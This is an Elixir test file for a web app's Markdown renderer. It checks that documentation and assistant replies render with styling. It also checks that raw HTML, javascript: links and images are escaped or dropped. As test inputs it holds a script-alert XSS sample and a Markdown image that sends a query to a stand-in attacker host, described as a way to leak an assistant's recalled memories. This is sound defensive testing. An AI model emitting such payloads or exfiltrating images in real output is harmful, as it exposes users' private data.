defmodule HcpConformanceWeb.MarkdownTest do
  use ExUnit.Case, async: true

  alias HcpConformanceWeb.Markdown

  test "drops the title, which the page header already shows" do
    assert Markdown.to_html("# Title\n\nBody\n") == "<p>Body</p>"
  end

  test "styles the tags Tailwind's preflight strips with daisyUI components" do
    html = Markdown.to_html("## Section\n\n- item\n\n[spec](https://example.com)\n")

    assert html =~ ~s(<h2 class="text-lg font-semibold leading-8 mt-8">Section</h2>)
    assert html =~ ~s(<ul class="list-disc pl-6 space-y-1">)
    assert html =~ ~s(<a class="link link-primary" href="https://example.com">spec</a>)
  end

  test "wraps tables so they scroll on narrow screens" do
    html = Markdown.to_html("| a | b |\n| --- | --- |\n| 1 | 2 |\n")

    assert html =~
             ~r{\A<div class="overflow-x-auto"><table class="table table-sm">.*</table></div>}s
  end

  test "renders code blocks unhighlighted, without inline theme styles" do
    assert Markdown.to_html("```json\n{\"a\": 1}\n```\n") ==
             ~s(<pre class="bg-base-300 rounded-box p-4 overflow-x-auto text-sm"><code class="language-json">{&quot;a&quot;: 1}\n</code></pre>)
  end

  test "escapes raw HTML, so every tag on the page is one MDEx made" do
    refute Markdown.to_html("<script>alert(1)</script>\n") =~ "<script>"
  end

  describe "an assistant's reply" do
    test "renders its Markdown, styled like the docs" do
      html =
        Markdown.reply_to_html(
          "You have **a snotty nose**. It may be:\n\n- a cold\n- hay fever\n"
        )

      assert html =~ "<strong>a snotty nose</strong>"
      assert html =~ ~s(<ul class="list-disc pl-6 space-y-1">)
      assert html =~ "<li>a cold</li>"
    end

    test "keeps a leading heading: a reply has no page header to repeat it" do
      assert Markdown.reply_to_html("# Advice\n") =~ "Advice</h1>"
    end

    test "shows raw HTML as text instead of running it" do
      html = Markdown.reply_to_html("<script>alert(1)</script>\n")

      refute html =~ "<script>"
      assert html =~ "&lt;script&gt;"
    end

    test "never loads an image, which could carry recalled memories to another host" do
      html = Markdown.reply_to_html("![your diet](https://attacker.example/?q=vegetarian)\n")

      refute html =~ "<img"
      refute html =~ "attacker.example"
      assert html =~ "your diet"
    end

    test "drops links to scripts" do
      refute Markdown.reply_to_html("[click](javascript:alert(1))\n") =~ "javascript:"
    end
  end
end
